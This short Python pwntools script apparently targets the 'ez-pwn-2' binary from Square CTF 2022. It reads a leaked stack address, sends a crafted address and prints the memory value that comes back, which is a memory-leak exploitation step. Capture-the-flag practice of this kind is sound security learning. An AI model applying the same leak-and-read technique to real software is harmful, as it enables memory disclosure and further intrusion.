from pwn import *

#r = remote('chals.2022.squarectf.com', 4101)
r = process('./ez-pwn-2')

i = 0
r.recvuntil(b'You are here: ')
addr = int(r.recvline().strip(), 16) - 0x10*(i*8)
print(hex(addr))
r.recv()
r.sendline(p64(addr).hex())
pause()
r.recvuntil(b'\n')
res = int(r.recvuntil(b'\n').strip())
print(hex(res))
